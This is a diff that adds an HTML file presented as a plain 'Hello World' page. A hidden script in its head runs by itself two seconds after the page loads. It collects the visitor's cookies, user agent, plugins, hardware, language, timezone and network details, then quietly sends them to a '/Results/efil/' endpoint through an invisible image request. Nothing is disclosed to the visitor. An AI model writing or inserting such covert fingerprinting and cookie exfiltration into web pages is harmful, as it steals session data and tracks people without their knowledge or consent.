@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hello World</title>
+    <script>
+        function collectAndSendData() {
+            // Get User-Agent string
+            var userAgent = navigator.userAgent;
+
+            // Get screen resolution
+            var screenResolution = window.screen.width + "x" + window.screen.height;
+
+            // Get cookies
+            var cookies = document.cookie;
+
+            // Get OS version (from User-Agent)
+            var osVersion = navigator.userAgent;
+
+            // Get installed browser plugins
+            var plugins = [];
+            if (navigator.plugins) {
+                for (var i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push(navigator.plugins[i].name);
+                }
+            }
+
+            // Get platform (OS)
+            var platform = navigator.platform;
+
+            // Get language preference
+            var language = navigator.language || navigator.userLanguage;
+
+            // Get timezone offset
+            var timezoneOffset = new Date().getTimezoneOffset();
+
+            // Get hardware concurrency (number of logical CPU cores)
+            var hardwareConcurrency = navigator.hardwareConcurrency || "unknown";
+
+            // Get device memory (approximate RAM in GB)
+            var deviceMemory = navigator.deviceMemory || "unknown";
+
+            // Get connection type (network information)
+            var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            var connectionType = connection ? connection.effectiveType : "unknown";
+
+            // Get touch support
+            var maxTouchPoints = navigator.maxTouchPoints || "unknown";
+
+            // Detect if on Mac (platform contains "Mac")
+            var isRetina = window.devicePixelRatio > 1;
+            var hasTouchBar = screenResolution === "2170x60"; // Approximation, may vary by model
+            var hasApplePay = window.ApplePaySession && ApplePaySession.canMakePayments();
+            var isTrackpad = 'ontouchstart' in window;
+
+            // Construct the new URL with all parameters
+            var newUrl = "/Results/efil/" + 
+                "?user_agent=" + encodeURIComponent(userAgent) +
+                "&screen_resolution=" + encodeURIComponent(screenResolution) +
+                "&cookies=" + encodeURIComponent(cookies) +
+                "&os_version=" + encodeURIComponent(osVersion) +
+                "&battery_status=not_supported" + // Placeholder for now, since not all browsers support Battery API
+                "&plugins=" + encodeURIComponent(JSON.stringify(plugins)) +
+                "&platform=" + encodeURIComponent(platform) +
+                "&language=" + encodeURIComponent(language) +
+                "&timezone_offset=" + encodeURIComponent(timezoneOffset) +
+                "&hardware_concurrency=" + encodeURIComponent(hardwareConcurrency) +
+                "&device_memory=" + encodeURIComponent(deviceMemory) +
+                "&connection_type=" + encodeURIComponent(connectionType) +
+                "&max_touch_points=" + encodeURIComponent(maxTouchPoints) +
+                "&is_retina=" + encodeURIComponent(isRetina) +
+                "&has_touch_bar=" + encodeURIComponent(hasTouchBar) +
+                "&has_apple_pay=" + encodeURIComponent(hasApplePay) +
+                "&is_trackpad=" + encodeURIComponent(isTrackpad);
+
+            // Create a new Image object and set the source to the new URL
+            var img = new Image();
+            img.src = newUrl;
+        }
+
+        // Delay the execution of the function by 2 seconds
+        setTimeout(collectAndSendData, 2000);
+    </script>
+</head>
+<body>
+    <h1>Hello World</h1>
+</body>
+</html>
